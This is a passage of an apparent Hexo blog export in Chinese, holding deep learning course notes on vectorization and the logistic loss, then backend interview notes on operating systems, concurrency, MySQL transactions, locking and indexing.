<h3 id="2-11-向量化"><a href="#2-11-向量化" class="headerlink" title="2.11. 向量化"></a>2.11. 向量化</h3><p>向量化：用 np.dot() 代替 for 循环。（其实，这是因为 numpy 底层用 C 实现，所以比 python 的 for 循环快很多，归根到底还是循环实现）</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-11-1.png" alt="2-11-1"></p>
<h3 id="2-12-向量化的更多例子"><a href="#2-12-向量化的更多例子" class="headerlink" title="2.12. 向量化的更多例子"></a>2.12. 向量化的更多例子</h3><p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-12-1.png" alt="2-12-1"></p>
<h3 id="2-13-向量化-logistic-回归"><a href="#2-13-向量化-logistic-回归" class="headerlink" title="2.13. 向量化 logistic 回归"></a>2.13. 向量化 logistic 回归</h3><p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-13-1.png" alt="2-13-1"></p>
<h3 id="2-14-向量化-logistic-回归中的梯度输出"><a href="#2-14-向量化-logistic-回归中的梯度输出" class="headerlink" title="2.14. 向量化 logistic 回归中的梯度输出"></a>2.14. 向量化 logistic 回归中的梯度输出</h3><p>下图左边是未使用向量化的代码，右边是使用了向量化的代码（其实就是 <code>numpy</code> 库）。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-14-1.png" alt="2-14-1"></p>
<h3 id="2-15-python-中的广播"><a href="#2-15-python-中的广播" class="headerlink" title="2.15. python 中的广播"></a>2.15. python 中的广播</h3><p><code>numpy</code> 的广播。</p>
<h3 id="2-16-关于-python-numpy-向量的说明"><a href="#2-16-关于-python-numpy-向量的说明" class="headerlink" title="2.16. 关于 python_numpy 向量的说明"></a>2.16. 关于 python_numpy 向量的说明</h3><p>略</p>
<h3 id="2-17-Jupyter-Ipython-笔记本的快速指南"><a href="#2-17-Jupyter-Ipython-笔记本的快速指南" class="headerlink" title="2.17. Jupyter Ipython 笔记本的快速指南"></a>2.17. Jupyter Ipython 笔记本的快速指南</h3><p>略</p>
<h3 id="2-18-logistic-损失函数的解释"><a href="#2-18-logistic-损失函数的解释" class="headerlink" title="2.18. logistic 损失函数的解释"></a>2.18. logistic 损失函数的解释</h3><p>在 logistic 回归中，可以把预测值 $\hat{y}$ 看作在 $x$ 条件下 $y$ 取 1 的概率；而 $1-\hat{y}$ 可以看作在 $x$ 条件下 $y$ 取 0 的概率。</p>
<p>注：在二分类问题中，$y$ 只有 1 或 0 两种取值。</p>
<p>综合两种情况，在 $x$ 条件下 $y$ 取 0 或 1 的概率为 $p(y|x) &#x3D; \hat{y}^y (1-\hat{y})^{(1-y)}$ （下图中有解释）。</p>
<p>如果想让 $p(y|x)$ 最大，可以先让 $log p(y|x)$ 最大（log 是单调函数）。</p>
<p>而 $log p(y|x) &#x3D; ylog\hat{y} + (1-y)log(1-\hat{y})$ 。</p>
<p>同时，结合上文提到的损失函数，我们可以发现： $log p(y|x) &#x3D; -L(\hat{y}, y)$ ，当损失函数最小时，$y$ 取期望值的概率就越大。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-18-1.png" alt="2-18-1"></p>
<p>如果想获得 m 个样本都取到期望值的概率 $P$，那应该将每个样本的概率相乘，即：$P &#x3D; \displaystyle\prod_{i&#x3D;1}^m p(y^{(i)}|x^{(i)})$。</p>
<p>如果使用<strong>最大似然估计</strong>，那需要找到一组参数使得 $P$ 的值最大。而令 $P$ 值最大，等价于令 $logP$ 最大。</p>
<p>由于 $logP &#x3D; \displaystyle\sum_{i&#x3D;1}^m log p(y^{(i)}|x^{(i)})$ ，进而可得：$logP &#x3D; -\displaystyle\sum_{i&#x3D;1}^mL(\hat{y}, y)$。</p>
<p>最后，当成本函数 $J(w,b) &#x3D; \frac{1}{m} \displaystyle\sum_{i&#x3D;0}^nL(\hat{y}^{(i)}, y^{(i)})$ 取最小值时，$logP$ 取最大值，也就是 $P$ 取最大值（m 个样本都取到期望值的概率最大）。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C2-18-2.png" alt="2-18-2"></p>
<h2 id="3-第三周-浅层神经网络"><a href="#3-第三周-浅层神经网络" class="headerlink" title="3. 第三周 - 浅层神经网络"></a>3. 第三周 - 浅层神经网络</h2><h3 id="3-1-神经网络概览"><a href="#3-1-神经网络概览" class="headerlink" title="3.1. 神经网络概览"></a>3.1. 神经网络概览</h3><p>约定：用 $W^{[i]}$ 上标表示第 $i$ 层的参数。</p>
<p><img src="/.%5C%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%5C3-1-1.png" alt="3-1-1"></p>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>后端面试问题汇总</title>
    <url>/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>起因：为2020年暑期实习生面试而准备，主要针对后端开发。</p>
<p>很多知识还了解得不够深入，如果存在错误，欢迎指正。</p>
<span id="more"></span>

<h2 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="1. 操作系统"></a>1. 操作系统</h2><h3 id="1-1-同步-异步-阻塞-非阻塞"><a href="#1-1-同步-异步-阻塞-非阻塞" class="headerlink" title="1.1. 同步 异步 阻塞 非阻塞"></a>1.1. 同步 异步 阻塞 非阻塞</h3><p><a href="https://www.zhihu.com/question/19732473">参考博客</a></p>
<p><strong>同步</strong>和<strong>异步</strong>关注的是<strong>消息通信机制</strong>：</p>
<ul>
<li>同步：A调用B，B在没有执行完成前不会返回，但一旦B返回，A就会得到返回结果。A是<strong>主动</strong>等待返回结果。</li>
<li>异步：A调用B，B直接返回，但A没有得到返回结果，B执行完成后会将结果通过状态、消息告知A。A<strong>被动</strong>等待返回结果。</li>
</ul>
<p>举个栗子：</p>
<p>你打电话去教务处查成绩。接通电话后，你说：“帮我查一下成绩”，教务处回答：“好，我查一下”。</p>
<p>如果是同步，那教务处不会挂电话，查到成绩后，告诉了你，才会挂电话。<strong>期间，你可以一直问：“好了没，好了没”</strong>。</p>
<p>如果是异步，那教务处说完就把电话挂了，查到成绩后，再通过短信或者电话的形式告诉你。</p>
<p><strong>阻塞</strong>和<strong>非阻塞</strong>关注的是<strong>程序在等待调用结果（消息，返回值）时的状态</strong>：</p>
<ul>
<li>阻塞：A在等待B完成并返回的过程中，不可以做其它事情。</li>
<li>非阻塞：A在等待B完成并返回的过程中，可以做其它事情。</li>
</ul>
<p>继续上述栗子：</p>
<p>不管是不挂电话等还是挂电话等，你都可以在这期间不做或者做其它事情，这就是阻塞和非阻塞。</p>
<p>那么：</p>
<ul>
<li><strong>同步阻塞</strong>，就是不挂电话等待的期间，你不做其它事情。这像是C语言的函数调用。</li>
<li><strong>同步非阻塞</strong>，就是不挂电话等待的期间，你做其它事情（比如吃手指）。在程序中，一般通过<strong>轮询</strong>的方式，就像做了一部分事情后，就问被调用程序：“好了没，好了没”，如果好了，就去获取返回结果。</li>
<li><strong>异步阻塞</strong>，就是挂了电话，等待成绩通知的期间，你什么都不做（四不四很傻）。</li>
<li><strong>异步非阻塞</strong>，就是挂了电话，等待成绩通知的期间，你可以吃手指。这像是JS语言的异步函数调用。</li>
</ul>
<h3 id="1-2-select-poll-epoll"><a href="#1-2-select-poll-epoll" class="headerlink" title="1.2. select, poll, epoll"></a>1.2. select, poll, epoll</h3><p><a href="https://segmentfault.com/a/1190000003063859">参考博客1</a><br><a href="https://zhuanlan.zhihu.com/p/36764771">参考博客2</a></p>
<p>（对这部分知识还是不太清楚。最近才发现CSAPP的最后一章并发编程中，有关于select的内容，后悔当时没看完。。。</p>
<p><code>select, poll, epoll</code>都是I&#x2F;O多路复用的机制。I&#x2F;O多路复用就是通过一种机制，一个进程可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），就通知程序进行相应的读写操作。</p>
<p>比如网络服务器需要监视多个socket，一旦其中一个有数据，就读入。</p>
<blockquote>
<p>当用户进程调用了<code>select</code>，那么整个进程会被阻塞，而同时，<code>kernel</code>会“监视”所有<code>select</code>负责的<code>socket</code>，当任何一个<code>socket</code>中的数据准备好了，<code>select</code>就会返回。这个时候用户进程再调用read操作，将数据从<code>kernel</code>拷贝到用户进程。</p>
</blockquote>
<p>那么，如何知道socket有数据呢？</p>
<blockquote>
<p><code>select</code>和<code>poll</code>都需要通过遍历文件描述符来获取已经就绪的<code>socket</code>。事实上，同时连接的大量客户端在一时刻可能只有很少的处于就绪状态，因此随着监视的描述符数量的增长，其效率也会线性下降。</p>
</blockquote>
<p><code>select</code>和<code>poll</code>是同步阻塞的，为无差别轮询。</p>
<blockquote>
<p>而<code>epoll</code>可以理解为<code>event poll</code>，不同于忙轮询和无差别轮询，epoll之会把哪个流发生了怎样的I&#x2F;O事件通知我们。此时我们对这些流的操作都是有意义的。（复杂度降低到了O(k)，k为产生I&#x2F;O事件的流的个数）</p>
</blockquote>
<h3 id="1-3-进程之间的通信方式以及优缺点"><a href="#1-3-进程之间的通信方式以及优缺点" class="headerlink" title="1.3. 进程之间的通信方式以及优缺点"></a>1.3. 进程之间的通信方式以及优缺点</h3><p><a href="https://interview.huihut.com/#/?id=%e8%bf%9b%e7%a8%8b%e4%b8%8e%e7%ba%bf%e7%a8%8b">参考博客</a></p>
<ul>
<li>管道（PIPE）<ul>
<li>有名管道：一种半双工(数据可以在一个信号载体的两个方向上传输，但是不能同时传输)的通信方式，它允许无亲缘关系进程间的通信<ul>
<li>优点：可以实现任意关系的进程间的通信</li>
<li>缺点：<ul>
<li>长期存于系统中，使用不当容易出错</li>
<li>缓冲区有限</li>
</ul>
</li>
</ul>
</li>
<li>无名管道：一种半双工的通信方式，只能在具有亲缘关系的进程间使用（父子进程）<ul>
<li>优点：简单方便</li>
<li>缺点：<ul>
<li>局限于单向通信</li>
<li>只能创建在它的进程以及其有亲缘关系的进程之间</li>
<li>缓冲区有限</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>信号量（Semaphore）：一个计数器，可以用来控制多个线程对共享资源的访问<ul>
<li>优点：可以同步进程</li>
<li>缺点：信号量有限</li>
</ul>
</li>
<li>信号（Signal）：一种比较复杂的通信方式，用于通知接收进程某个事件已经发生</li>
<li>消息队列（Message Queue）：是消息的链表，存放在内核中并由消息队列标识符标识<ul>
<li>优点：可以实现任意进程间的通信，并通过系统调用函数来实现消息发送和接收之间的同步，无需考虑同步问题，方便</li>
<li>缺点：信息的复制需要额外消耗 CPU 的时间，不适宜于信息量大或操作频繁的场合</li>
</ul>
</li>
<li>共享内存（Shared Memory）：映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问<ul>
<li>优点：无须复制，快捷，信息量大</li>
<li>缺点：<ul>
<li>通信是通过将共享空间缓冲区直接附加到进程的虚拟地址空间中来实现的，因此进程间的读写操作的同步问题</li>
<li>利用内存缓冲区直接交换信息，内存的实体存在于计算机中，只能同一个计算机系统中的诸多进程共享，不方便网络通信</li>
</ul>
</li>
</ul>
</li>
<li>套接字（Socket）：可用于不同计算机间的进程通信<ul>
<li>优点：<ul>
<li>传输数据为字节级，传输数据可自定义，数据量小效率高</li>
<li>传输数据时间短，性能高</li>
<li>适合于客户端和服务器端之间信息实时交互</li>
<li>可以加密,数据安全性强</li>
</ul>
</li>
<li>缺点：需对传输的数据进行解析，转化成应用级的数据。</li>
</ul>
</li>
</ul>
<h3 id="1-4-线程之间的数据同步"><a href="#1-4-线程之间的数据同步" class="headerlink" title="1.4. 线程之间的数据同步"></a>1.4. 线程之间的数据同步</h3><ul>
<li>锁机制：包括互斥锁&#x2F;量(mutex)、读写锁(reader-writer lock)、自旋锁(spin lock)、条件变量(condition)<ul>
<li>**互斥锁&#x2F;量(mutex)**：提供了以排他方式防止数据结构被并发修改的方法。</li>
<li>**读写锁(reader-writer lock)**：允许多个线程同时读共享数据，而对写操作是互斥的。</li>
<li>**自旋锁(spin lock)**：与互斥锁类似，都是为了保护共享资源。互斥锁是当资源被占用，申请者进入睡眠状态；而自旋锁则循环检测保持者是否已经释放锁。</li>
<li>条件变量(condition)：可以以原子的方式阻塞进程，直到某个特定条件为真为止。对条件的测试是在互斥锁的保护下进行的。条件变量始终与互斥锁一起使用。</li>
</ul>
</li>
<li>信号量机制(Semaphore)<ul>
<li>无名线程信号量</li>
<li>命名线程信号量</li>
<li>信号机制(Signal)：类似进程间的信号处理</li>
</ul>
</li>
<li>屏障（barrier）：屏障允许每个线程等待，直到所有的合作线程都达到某一点，然后从该点继续执行。</li>
</ul>
<p>线程间的通信目的主要是用于线程同步，所以线程没有像进程通信中的用于数据交换的通信机制</p>
<h3 id="1-5-孤儿进程与僵尸进程"><a href="#1-5-孤儿进程与僵尸进程" class="headerlink" title="1.5. 孤儿进程与僵尸进程"></a>1.5. 孤儿进程与僵尸进程</h3><ul>
<li><p>孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</p>
</li>
<li><p>僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵尸进程。</p>
</li>
</ul>
<h3 id="1-6-程序加载过程"><a href="#1-6-程序加载过程" class="headerlink" title="1.6. 程序加载过程"></a>1.6. 程序加载过程</h3><p><a href="https://hitworld.github.io/posts/507ee6ce/">参考博客-曹神</a></p>
<p>以ELF文件的运行为例。当执行<code>./test</code>时发生了什么：</p>
<ul>
<li>shell读取命令发现这是一个执行命令。调用<code>fork()</code>并在子进程中执行<code>execve(&quot;./test&quot;, *argv[], *envp[])</code>。</li>
<li><code>execve</code>系统调用会使进程陷入内核态，调用<code>sys_execve</code> -&gt; <code>do_execve</code> -&gt; …(<code>sys_execve</code>检测execve的后两个参数，<code>do_execve</code>判断文件类型并调用对应的处理器)，最后调用<code>load_elf_binary</code>解析文件头，如果程序为动态链接则通过。<code>interp</code>确定加载器路径，然后通过程序头表加载ELF文件，最后修改<code>sys_execve</code>返回地址返回用户态(动态链接返回ld.so的entry point，静态链接返回ELF的entry point)。</li>
<li>动态链接情况下，ld.so会进行映射共享库，初始化GOT等操作，最后返回ELF的entry point。</li>
<li>ELF的<code>entry point</code>一般为<code>_start</code>，负责将环境变量指针，<code>.init</code>指针和<code>.fini</code>指针传给<code>libc_start_main</code>函数。</li>
<li><code>libc_start_main</code>函数依次调用<code>.init</code>，<code>main</code>，<code>.fini</code>，最后执行<code>exit</code>结束程序的运行。</li>
</ul>
<h3 id="1-7-gdb调试的本质"><a href="#1-7-gdb调试的本质" class="headerlink" title="1.7. gdb调试的本质"></a>1.7. gdb调试的本质</h3><p><a href="https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/">参考博客</a></p>
<p>gdb调试的本质是<code>ptrace</code>系统调用。</p>
<p>单步执行的本质是调用<code>ptrace</code>时，传入单步执行的命令——<code>PTRACE_SINGLESTEP</code>。</p>
<p>断点的本质是<strong>软中断</strong>——<code>int 3</code>。</p>
<h3 id="1-8-fork-函数的返回"><a href="#1-8-fork-函数的返回" class="headerlink" title="1.8. fork() 函数的返回"></a>1.8. fork() 函数的返回</h3><p>fork()创建子进程，子进程得到父进程虚拟地址空间的副本。</p>
<p>fork()函数调用一次，返回两次。在父进程中，它会返回子进程的PID进程号；在子进程中，它会返回0。</p>
<h3 id="1-9-死锁"><a href="#1-9-死锁" class="headerlink" title="1.9. 死锁"></a>1.9. 死锁</h3><p>产生死锁的原因：</p>
<ul>
<li>竞争不可抢占性资源引起死锁</li>
<li>竞争可消耗资源引起死锁</li>
<li>进程推进顺序不当引起死锁</li>
</ul>
<p>死锁简单定义：在一组进程发生死锁的情况下，这组死锁进程中的每一个进程，都在等待另一个死锁进程所占有的资源。</p>
<p>产生死锁的四个必要条件：</p>
<ul>
<li>互斥</li>
<li>不可抢占</li>
<li>环路等待</li>
<li>请求和保持：进程请求不到资源会阻塞，但不会释放自己已获得的资源</li>
</ul>
<p>这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之<br>一不满足，就不会发生死锁。</p>
<p>处理死锁的方法：</p>
<ol>
<li>预防死锁：破坏四个必要条件中的一个。</li>
<li>避免死锁：并不是事先采取限制条件，而是在资源分配的过程中，防止系统进入不安全状态（银行家算法）。</li>
<li>检测死锁。</li>
<li>解除死锁。</li>
</ol>
<h2 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2. 数据库"></a>2. 数据库</h2><p>参考：</p>
<ul>
<li><a href="https://www.jianshu.com/p/5052f6a454ef">MySQL 面试之必会知识点</a></li>
<li><a href="https://cyc2018.github.io/CS-Notes/#/notes/MySQL">CS-Notes MySQL</a></li>
<li><a href="https://baijiahao.baidu.com/s?id=1611918898724887602&wfr=spider&for=pc">数据库常用的事务隔离级别都有哪些？都是什么原理？</a></li>
</ul>
<h3 id="2-1-三大范式"><a href="#2-1-三大范式" class="headerlink" title="2.1. 三大范式"></a>2.1. 三大范式</h3><ul>
<li>1NF：要求属性具有原子性，不可再分解；</li>
<li>2NF：要求记录有惟一标识；</li>
<li>3NF：任何字段不能由其他字段派生出来，它要求字段没有冗余。</li>
</ul>
<h3 id="2-2-事务特性-ACID"><a href="#2-2-事务特性-ACID" class="headerlink" title="2.2. 事务特性(ACID)"></a>2.2. 事务特性(ACID)</h3><p>事务指的是满足 ACID 特性的<strong>一组操作</strong>，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。</p>
<ul>
<li>**原子性(Atomicity)**：不可分割的操作单元，事务中所有操作，要么全部成功；要么撤回到执行事务之前的状态</li>
<li>**一致性(Consistency)**：如果在执行事务之前数据库是一致的，那么在执行事务之后数据库也还是一致的；</li>
<li>**隔离性(Isolation)**：事务操作之间彼此独立和透明互不影响。事务独立运行。这通常使用锁来实现。一个事务处理后的结果，影响了其他事务，那么其他事务会撤回。事务的100%隔离，需要牺牲速度。</li>
<li>**持久性(Durability)**：事务一旦提交，其结果就是永久的。即便发生系统故障，也能恢复。</li>
</ul>
<h3 id="2-3-事务隔离"><a href="#2-3-事务隔离" class="headerlink" title="2.3. 事务隔离"></a>2.3. 事务隔离</h3><p>事务的隔离性就是指，多个<strong>并发的事务</strong>同时访问一个数据库时，一个事务不应该被另一个事务所干扰，每个并发的事务间要相互进行隔离。</p>
<p>如果没有事务隔离，会出现什么样的情况呢？</p>
<ul>
<li><strong>脏读</strong>：事务A修改或插入的数据，未提交，事务B查询数据时则会出现事务A修改或插入的数据。<strong>读取到未提交的修改或插入数据。</strong></li>
<li><strong>不可重复读</strong>：事务A第一次读取了一条记录，未提交，事务B过来更新该记录<strong>并提交了</strong>，事务A再一次读取这条记录，发现数据发生了改变。<strong>两次读取之间进行了数据更新的事务提交。</strong></li>
<li><strong>幻读</strong>：事务A查询所有数据，未提交，事务B过来插入或者删除了一条数据，事务A再一次查询所有数据，发现数据多了或者少了。<strong>两次读取之间进行了数据插入或者删除的事务提交。</strong></li>
</ul>
<p>为了防止上述情况，我们需要设置数据库的隔离级别。一般的数据库，都包括以下<strong>四种隔离级别</strong>：</p>
<ul>
<li><p>**读未提交(Read Uncommitted)**：可以读取到未提交的内容。在这种隔离级别下，读是不会加锁的，因此，这种隔离级别的一致性是最差的，可能会产生“脏读”、“不可重复读”、“幻读”。</p>
</li>
<li><p><strong>读提交(Read Committed)<strong>：只能读到已经提交了的内容，是SQL Server和Oracle的默认隔离级别。这种隔离级别能够有效的</strong>避免脏读</strong>。其原理是（自我理解）：读的时候不加锁，采用<strong>乐观锁的版本号机制</strong>，读取最后一次提交的数据版本，<strong>读的时候可以进行写操作</strong>；写的时候(修改、增加、删除)，加行排他锁。</p>
</li>
<li><p><strong>可重复读(Repeated Read)<strong>：专门针对“不可重复读”这种情况而制定的隔离级别，是MySql的默认隔离级别。能够</strong>避免脏读、不可重复读</strong>。其原理应该是（自我理解）：<strong>悲观锁</strong>，读的时候加<strong>行级共享锁</strong>，写的的时候加<strong>行级排他锁</strong>，<strong>读写不能同时进行</strong>。由于锁是行级的，所以不能杜绝插入操作（好像能杜绝删除操作），不能避免幻读。</p>
</li>
<li><p><strong>串行化(Serializable)<strong>：最高的隔离级别，这种级别下，事务“串行化顺序执行”，也就是一个一个排队执行。这种级别下，</strong>“脏读”、“不可重复读”、“幻读”都可以被避免</strong>，但是执行效率奇差，性能开销也最大，所以基本没人会用。原理是，读的时候加<strong>表级共享锁</strong>，写的时候加<strong>表级排他锁</strong>。</p>
</li>
</ul>
<p><img src="/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1.png" alt="1"></p>
<p>值得注意的是，四种隔离级别都是针对读操作，因为写操作一般是不允许同时进行的。</p>
<h3 id="2-4-共享锁和排他锁"><a href="#2-4-共享锁和排他锁" class="headerlink" title="2.4. 共享锁和排他锁"></a>2.4. 共享锁和排他锁</h3><p>**共享锁(S锁)**：如果事务A给数据D加了共享锁，那么事务A可以读数据，但不能写数据。</p>
<p>**排他锁(X锁)**：如果事务A给数据D加了排他锁，那么事务A可以读数据，也可以写数据。</p>
<p>根据字面意思，我们可以看出，共享锁可以与共享锁兼容，排他锁与任意锁都不兼容。</p>
<p>举个栗子：</p>
<ol>
<li><p>如果事务A只需要读取数据D，那A只需要对D加共享锁。这样，事务B过来，也可以对数据D加共享锁，并读取数据。但是，事务B不能对D加排他锁，因为共享锁与排他锁不兼容。</p>
</li>
<li><p>如果事务A需要对数据D进行修改，那A需要对D加排他锁。这样，事务B必须要等事务A解锁后，才能进行操作。</p>
</li>
</ol>
<h3 id="2-5-乐观锁和悲观锁"><a href="#2-5-乐观锁和悲观锁" class="headerlink" title="2.5. 乐观锁和悲观锁"></a>2.5. 乐观锁和悲观锁</h3><p><a href="https://www.jianshu.com/p/f5ff017db62a">参考博客1</a><br><a href="https://juejin.im/post/5b4977ae5188251b146b2fc8">参考博客2</a></p>
<p>不同于共享锁和排他锁，乐观锁和悲观锁是一种思想。不只是在数据库，在很多并发场景中，乐观锁和悲观锁都是保持数据同步的一种重要思想。</p>
<p><strong>悲观锁</strong>：认为事情总是悲观的，每次拿数据时都认为会有人来修改数据。所以，在读取数据时，会加共享锁；修改数据时，会加排他锁。适用于写多读少的场景。</p>
<p><strong>乐观锁</strong>：认为事情总是乐观的，数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测。所以，读写都不会加锁。适用于读多写少的场景，能够提高吞吐量。</p>
<p><strong>乐观锁可以认为是一种在最后提交的时候检测冲突的手段，而悲观锁则是一种避免冲突的手段。</strong></p>
<p>乐观锁的实现有两种：</p>
<ul>
<li><p>版本号机制：一般是在数据表中加上一个数据版本号version字段。当数据被修改时，version值会加一。当线程A要更新数据值时，会读取version值。提交更新时，若刚才读取到的version值为当前数据库中的version值相等时才更新，否则重试更新操作，直到更新成功。</p>
</li>
<li><p>CAS算法：<a href="https://mp.weixin.qq.com/s?__biz=MzIxMjE5MTE1Nw==&mid=2653192625&idx=1&sn=cbabbd806e4874e8793332724ca9d454&chksm=8c99f36bbbee7a7d169581dedbe09658d0b0edb62d2cbc9ba4c40f706cb678c7d8c768afb666&scene=21#wechat_redirect">漫画：什么是 CAS 机制？</a></p>
</li>
</ul>
<h3 id="2-6-Mysql-存储引擎-InnoDB-和-MyISAM-区别"><a href="#2-6-Mysql-存储引擎-InnoDB-和-MyISAM-区别" class="headerlink" title="2.6. Mysql 存储引擎 InnoDB 和 MyISAM 区别"></a>2.6. Mysql 存储引擎 InnoDB 和 MyISAM 区别</h3><ul>
<li>事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。</li>
<li>并发：InnoDB 支持行级锁，MyISAM 只支持表级锁。</li>
<li>外键：InnoDB 支持外键。</li>
<li>备份：InnoDB 支持在线热备份。</li>
<li>全文索引：MyISAM支持全文类型索引，而InnoDB不支持全文索引。</li>
<li>崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。</li>
<li>其它特性：MyISAM 支持压缩表和空间数据索引。</li>
</ul>
<h3 id="2-7-Mysql索引原理"><a href="#2-7-Mysql索引原理" class="headerlink" title="2.7. Mysql索引原理"></a>2.7. Mysql索引原理</h3><p><strong>MyISAM</strong>引擎使用B+Tree作为索引结构，叶节点的data域存放的是<strong>数据记录的地址</strong>。</p>
<p><img src="/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/2.png" alt="1"></p>
<p><strong>InnoDB</strong>也使用B+Tree作为索引结构，但InnoDB的数据文件本身就是索引文件，<strong>用主键做索引</strong>，叶节点data域保存了完整的数据记录。</p>
<p><img src="/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/3.png" alt="1"><br><img src="/%E5%90%8E%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/4.png" alt="1"></p>
<p>关于B树和B+树，建议复习数据结构。上述两幅图都是B+树。</p>
<p>Mysql的索引种类包括：</p>
<ul>
<li>主键索引，也是一种唯一索引</li>
<li>唯一索引(unique)，该列具有唯一性，同时又是索引</li>
<li>普通索引(index)</li>
<li>全文索引(fulltext)，只有MyISAM存储引擎支持 （注：mysql 5.6之后，Innodb也开始支持全文索引）</li>
</ul>
<h3 id="2-8-为什么要使用B-树"><a href="#2-8-为什么要使用B-树" class="headerlink" title="2.8. 为什么要使用B+树"></a>2.8. 为什么要使用B+树</h3><p><a href="https://www.jianshu.com/p/86a1fd2d7406">参考博客</a></p>
<ol>
<li><p>磁盘读写代价更低<br>  树的非叶子结点里面没有数据，这样索引比较小，可以放在一个blcok（或者尽可能少的blcok）里面。<strong>避免了树形结构不断的向下查找，然后磁盘不停的寻道，读数据</strong>。这样的设计，可以降低io的次数。</p>
</li>
<li><p>查询效率更加稳定<br>  非终结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引。所以任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。</p>
</li>
<li><p>遍历所有的数据更方便<br>  B+树只要遍历叶子节点就可以实现整棵树的遍历，而其他的树形结构 要中序遍历才可以访问所有的数据。</p>
</li>
</ol>
<h3 id="2-9-慢查询"><a href="#2-9-慢查询" class="headerlink" title="2.9. 慢查询"></a>2.9. 慢查询</h3><p><a href="https://www.jianshu.com/p/7529a0fbf088">参考博客</a></p>
<p>MySQL慢查询就是在日志中记录运行比较慢的SQL语句，这个功能需要开启才能用。</p>
<h3 id="2-10-字段的数据类型"><a href="#2-10-字段的数据类型" class="headerlink" title="2.10. 字段的数据类型"></a>2.10. 字段的数据类型</h3><p><a href="https://blog.csdn.net/bzhxuexi/article/details/43700435">参考博客</a></p>
<p>char和varchar：</p>
<ol>
<li><p>char(n) 若存入字符数小于n，则以空格补于其后，查询之时再将空格去掉。所以char类型存储的字符串末尾不能有空格，varchar不限于此。</p>
</li>
